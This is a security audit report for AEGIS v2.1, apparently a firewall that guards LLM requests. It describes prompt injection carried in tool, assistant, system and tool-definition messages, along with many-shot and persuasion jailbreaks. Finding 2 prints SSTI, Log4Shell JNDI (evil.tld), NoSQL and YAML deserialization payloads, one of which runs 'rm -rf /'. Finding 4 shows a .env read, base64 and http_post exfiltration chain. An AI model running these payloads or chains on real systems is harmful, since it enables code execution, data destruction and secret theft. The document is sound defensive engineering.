# AEGIS v2.1 — Security Audit & Hardening

An audit of the v2.1 build against the enterprise threat list. Four findings,
all fixed, all with regression tests and before/after numbers.

The first finding is the one that matters: **the firewall was inspecting one
string per request.**

---

## Finding 1 — Whole-conversation coverage (CRITICAL)

### What was wrong

`POST /v1/chat/completions` called `body.latest_user_text()` and inspected
exactly that. Everything else in the request reached the model uninspected.

Five attack shapes were verified to bypass **every** detection layer:

| Bypass | Where the payload sat | Result before fix |
|---|---|---|
| Poisoned tool result | `role: "tool"` | `allow` |
| Poisoned assistant turn | `role: "assistant"` | `allow` |
| Poisoned system message | `role: "system"` | `allow` |
| Poisoned tool definition | `tools[].function.description` | `allow` |
| Poisoned earlier user turn | `messages[0]` | `allow` |

This is worse than a weak detector. The detectors were always capable of
catching these payloads — they were never shown them. Every dashboard read
clean while the attack succeeded.

### Why it matters most in agentic systems

The user's latest turn is the one part of an agentic request the attacker
usually does *not* control. What they do control:

- **`role: "tool"`** — tool results are a web page, a database row, an API
  response. This is the primary indirect-injection carrier in every agent
  framework, and it is fed back verbatim as context.
- **`role: "assistant"`** — a client assembles this array. Nothing guarantees
  that text was ever produced by the model. It is a free write into the model's
  own voice, which models weight heavily.
- **`role: "system"`** — in a gateway the client is not the operator. A system
  turn asking to disable rules is a privilege-escalation attempt, not config.
- **`tools[]`** — descriptions and *parameter* descriptions enter the model's
  context every turn. The parameter slot is the one people forget.

### The fix

`app/pipeline/conversation.py` inspects every message, weighted by role:

```
tool / function     1.35×   fully attacker-reachable, fully trusted as fact
assistant           1.25×   unauthenticated write into the model's own voice
system / developer  1.15×   client-supplied, not operator-supplied
user (earlier)      1.05×   the user's own voice, mildly weighted
```

The **latest user turn keeps the v2.0 prompt path unchanged** — over-defense
relief included — because a human is allowed to phrase a request oddly. Every
other message gets the surface prior: *data must not instruct.* That asymmetry
is what blocks a poisoned tool result without breaking people who write "ignore
the formatting errors in my draft".

Two findings fire on top of the base scan:

- `tool-result-instructs` — the model asked a question and the answer told it
  what to do.
- `<role>-turn-escalation` — a client-supplied system/assistant turn attempting
  concealment, authority claims, recursion, or delayed triggers. Persona-setting
  is fine; removing guardrails is not.

Bounded by `AEGIS_CONVERSATION_MAX_MESSAGES` (default 40) on top of the schema's
200-message cap, so a legal-but-large request still costs O(window).

### Result

All five bypasses now blocked; benign multi-turn traffic unaffected.
See `benchmark/out/audit_report.md` — conversation family **0% → 100%** detection
at **0% FPR**.

---

## Finding 2 — Structural injection (OWASP LLM05)

### What was wrong

Every layer asked "is this trying to hijack the model?". None asked **"where do
these bytes go next?"**

An LLM is rarely the last hop. Its output flows into template engines, YAML
loaders, log pipelines, databases, and browsers. Verified bypasses:

```
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}   allow
${T(java.lang.Runtime).getRuntime().exec('whoami')}                    allow
${jndi:ldap://evil.tld/a}                                              allow
config: !!python/object/apply:os.system ['rm -rf /']                   allow
{"user": {"$where": "this.pw.length > 0"}}                             allow
```

None of these is a jailbreak. None asks the model for anything. They are inert
as prompts and become remote code execution one hop later, when something
renders or parses the response. The model was never the target; it was the
delivery mechanism.

### The fix

`app/pipeline/structural.py`, wired as a first-class pipeline layer **and** into
the surface engine (so a template payload in a retrieved chunk or a tool
argument is caught too). Coverage:

- **SSTI** — Jinja2/Twig sandbox escape, Java EL/OGNL/MVEL, ERB, Freemarker,
  Velocity, Handlebars, Smarty
- **JNDI / Log4Shell** — including the nested `${${lower:j}ndi:` obfuscation
- **Deserialization** — YAML `!!python/`/`!ruby/`, Java serialized streams
  (`rO0AB`), PHP objects, pickle opcodes, .NET type confusion, XXE
- **Query/protocol** — NoSQL operators, LDAP filters, XPath, prototype
  pollution, CRLF header injection, ANSI terminal escapes

Plus two prompt attacks whose signal is structural rather than lexical:

- **Many-shot jailbreak** — the signal is the *count* of fabricated dialogue
  pairs plus near-universal compliance in the fake replies. A real pasted
  transcript has neither, so it is not flagged.
- **Stacked persuasion** — emotional appeal, false urgency, authority pressure,
  consequence threats, reward hacking, secrecy appeals, exception pleas.
  Individually these are how people write; **two or more stacked** is the
  signal. One urgent sentence does not fire.

The scanner never renders, parses, evaluates, or deserializes anything. It only
recognises shapes.

### Result

**0% → 100%** detection at **0% FPR**. Jinja2 documentation, YAML config, JSON
payloads, a Log4Shell write-up, and a real transcript all still pass.

---

## Finding 3 — Authorization was a role string

### What was wrong

v2.0 had a coarse `Principal.role` (`admin`/`analyst`) and per-tenant substring
deny lists. That answers "may this key call the API?" but not what an enterprise
actually asks:

> Can a **contractor** in the **EU** invoke the **payments** tool on a
> **restricted** document, from **outside** the corporate network, at **03:00**,
> when their trust score dropped after three blocks?

Every clause is a different authorization model.

### The fix

`app/policy/rbac.py` — three models, combined **deny-overrides**, **default-deny**:

- **RBAC** — hierarchical roles (`viewer → operator → analyst → approver →
  admin`) with glob permissions (`tool:invoke:read_*`). Cycle-safe inheritance:
  a misconfigured `inherits` loop returns what it resolved rather than
  recursing forever, because a policy bug must not become an outage.
- **ABAC** — the XACML four (subject/resource/action/environment) with 14
  operators and **attribute-to-attribute comparison** (`${resource.classification_level}`),
  which is what makes "clearance ≥ classification" expressible at all.
- **OPA-compatible** — nested `all`/`any`/`not` rule trees in the decision shape
  OPA policies conventionally produce, so Rego-authored policy translates
  mechanically. `set_external_evaluator()` delegates to a real OPA sidecar;
  returning `None` abstains and lets RBAC decide.

Baseline rules ship for cross-tenant denial, clearance, quarantined content, and
low-trust withdrawal. Tenant isolation and clearance are **also enforced in
code**, not only as rules — the one boundary that must not depend on a policy
document being present.

### Dynamic trust — closing the detection→authorization loop

A principal's trust decays on blocked requests and recovers **with time, not with
good behaviour** (otherwise an attacker floods benign requests to buy privilege
back). Because trust is an attribute, ABAC references it directly:

```
initial              ALLOW  trust=1.0
after 1 blocked req  ALLOW  trust=0.75
after 2 blocked req  ALLOW  trust=0.50
after 3 blocked req  DENY   trust=0.25   ← tool:invoke:send_email withdrawn
```

No human touched a policy. Degradation is proportionate: reads survive, with a
`require-approval:degraded-trust` obligation attached. Detection that never
changes entitlement is just logging.

---

## Finding 4 — Tool chains

### What was wrong

`app/surfaces/tools.py` inspects one call at a time, which is structurally blind
to the most common real-world agent compromise, because every step is
individually legitimate:

```
1. read_file("/srv/workspace/.env")            allowed — inside the workspace
2. base64_encode(<contents>)                   allowed — a pure transform
3. http_post("https://hooks.example.com", …)   allowed — an approved host
```

No single call violates a rule. The exfiltration is the *edge* between them.
Reviewing calls one at a time is like approving each wire transfer under the
reporting threshold.

### The fix

`app/surfaces/toolchain.py` — per-session taint tracking:

- **Taint flow** — content fingerprints propagate from sensitive sources to
  outbound sinks, surviving base64, case changes, reflows, and embedding in a
  larger argument.
- **Laundering** — a transform between a sensitive read and a send scores
  *above* plain adjacency; benign workflows rarely encode data purely to move it.
- **Privilege ramp** — sessions escalating monotonically from reads to
  high-consequence actions.
- **Loops and velocity** — repeated identical calls and machine-speed fan-out
  (LLM10), which is also the shape of a prompt-injected worker.

Two implementation details that were wrong on the first pass and are worth
recording, because both fail *silently*:

1. **Fingerprints must be alignment-invariant.** Strided shingling only collides
   when both texts share an offset — embedding the payload after a URL of
   arbitrary length shifts every window and the sets miss completely, which is
   exactly what an exfiltration call looks like. Fixed with stride-1 windows and
   deterministic hash sampling to bound memory.
2. **Topic words are not secrets.** Matching `invoice`/`customer`/`financial`
   against result *content* flagged every business document — a refund policy
   mentions invoices. Locator words now match only tool names and arguments
   (a file called `credentials`); result bodies are matched against secrets by
   *shape* (AWS keys, private key blocks, `KEY=value` assignments).

### Result

Staged exfiltration caught at step 3 with 16 taint hits through base64, while
`search → read policy.md → email summary` stays clean.

---

## Verification

```bash
make test            # 261 tests (was 214 pre-audit, 90 in v2.0)
make bench           # v2.0 prompt benchmark — unchanged
make bench-surfaces  # indirect injection across 7 surfaces
make bench-audit     # this document's before/after
make redteam         # evasion sweep — unchanged
```

| Suite | Result |
|---|---|
| Unit + integration | **261 passing** |
| v2.0 prompt benchmark | F1 **1.000**, FPR **0.000** — unchanged |
| Evasion red-team | ~**0% ASR**, multi-turn 10/10 — unchanged |
| Surface benchmark | **100%** detection / **0%** FPR (baseline 20.7%) |
| Audit benchmark | **0% → 100%** detection / **0%** FPR |

Backward compatibility is total: every v2.0 route, verdict, and threshold is
unchanged, and all new inspection is additive.

---

## Honest limitations

**The benchmark numbers are calibrated against corpora that ship with this
repo.** Bugs those corpora exposed were fixed, which inflates the numbers
relative to unseen traffic. What they establish is directional and worth stating
plainly: payloads in non-latest-user messages were previously *not inspected at
all*, and template/deserialization payloads had *no matching rule*. Both are now
covered, and the hard negatives show that coverage did not come at the cost of
flagging ordinary traffic. They do not establish that any specific percentage
generalises.

**Still not done**, and honestly out of reach in an offline build:

- The transformer / embedding / graph-reasoning ensemble — needs models this
  repo deliberately does not ship. The architecture is model-agnostic and the
  plug points exist (`AEGIS_HF_MODEL_DIR`, gated by S3).
- Public benchmark suites (Garak, PyRIT, JailbreakBench, AdvBench, HarmBench,
  AgentDojo, BIPIA) — all require network access.
- Real OCR/ASR — provider hooks exist and stay inert; `coverage` reports
  un-analysed channels rather than implying a clean verdict.
- Load and chaos testing of the new layers; external WORM audit sink; pen test.

See `docs/PRODUCTION.md` for the full gap list.
